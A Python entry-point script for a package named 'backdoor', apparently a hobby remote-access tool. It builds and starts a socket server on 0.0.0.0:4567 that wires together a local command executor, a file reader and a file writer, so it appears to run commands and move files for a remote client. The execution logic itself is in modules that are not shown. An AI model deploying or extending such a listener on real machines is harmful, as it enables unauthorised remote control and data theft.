# pyright: reportUnusedVariable=false
from argparse import ArgumentParser, Namespace

from backdoor.command.converter import InputToCommandConverter
from backdoor.command.executor import LocalCommandExecutor
from backdoor.command.processor import CommandProcessor
from backdoor.files.io import FileReader, FileWriter
from backdoor.messages.exchange.server import ServerExchangeMapper
from backdoor.messages.messenger import SocketMessenger
from backdoor.messages.protocol import SocketProtocol
from backdoor.serialization.jsonserializer import JsonSerializer
from backdoor.server.core import Server


DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 4567


def parse_args() -> Namespace:
    parser = ArgumentParser()
    parser.add_argument("-a", "--host", required=False, default=DEFAULT_HOST)
    parser.add_argument("-p", "--port", required=False, default=DEFAULT_PORT, type=int)
    return parser.parse_args()


def create_server(host: str, port: int) -> Server:
    protocol = SocketProtocol()
    serializer = JsonSerializer()
    converter = InputToCommandConverter()
    file_writer = FileWriter()
    file_reader = FileReader()

    messenger = SocketMessenger(protocol, serializer)
    exchanger = ServerExchangeMapper(messenger)
    executor = LocalCommandExecutor()
    processor = CommandProcessor(file_writer, file_reader)

    return Server(
        messenger,
        exchanger,
        converter,
        processor,
        executor,
        host=host,
        port=port,
    )


def main() -> None:
    args = parse_args()

    server = create_server(args.host, args.port)

    try:
        print(f"Server running at {args.host}:{args.port}.")
        server.start()
    except KeyboardInterrupt:
        ...


if __name__ == "__main__":
    main()
